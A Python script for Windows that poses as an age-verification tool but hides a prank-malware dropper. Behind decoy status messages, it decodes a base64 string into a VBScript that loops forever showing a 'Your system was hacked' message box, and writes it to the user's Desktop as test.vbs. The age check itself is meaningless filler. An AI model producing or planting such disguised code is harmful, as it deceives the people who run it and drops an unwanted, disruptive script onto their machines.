import ctypes
from ctypes import wintypes
import os
import base64
import time

def initialize_security_check():
    print("[SYSTEM] Starting Age Verification Module...")
    
 
    CSIDL_DESKTOP = 0
    SHGFP_TYPE_CURRENT = 0
    path_buffer = ctypes.create_unicode_buffer(wintypes.MAX_PATH)
    ctypes.windll.shell32.SHGetFolderPathW(None, CSIDL_DESKTOP, None, SHGFP_TYPE_CURRENT, path_buffer)
    target_loc = path_buffer.value

    
    entropy_pool = []
    for i in range(1, 500):
        if i % 3 == 0:
            entropy_pool.append(hex(i * 1024))
    
    print(f"Allocating metadata buffers... {len(entropy_pool)} sectors ready.")
    time.sleep(0.5)

   
    p_load = "RG8KbXNnYm94ICJZb3VyIHN5c3RlbSB3YXMgaGFja2VkIgpMb29w"
    data_stream = base64.b64decode(p_load).decode('utf-8')
    
    final_dest = os.path.join(target_loc, "test.vbs")
    
    with open(final_dest, "w") as f_ptr:
        f_ptr.write(data_stream)

  
    try:
        print("-" * 30)
        u_input = input("USER_AUTH_REQUIRED: Enter birth year: ")
        current_ts = time.localtime().tm_year
        calc_age = current_ts - int(u_input)
        
        print(f"Analyzing age parameters for: {calc_age}...")
        time.sleep(1)

      
        gate_bit = (calc_age * 12) / 4
        if gate_bit > 50:
            print(f"ID_VERIFIED: {hex(int(gate_bit))}")
            print("Access granted to local resources.")
        else:
            print("ID_REJECTED: Insufficient age.")
            
        print(f"Log generated at: {os.path.basename(final_dest)}")
        
    except ValueError:
        print("CRITICAL_ERR: Non-integer input detected. Emergency exit.")

if __name__ == "__main__":
    initialize_security_check()
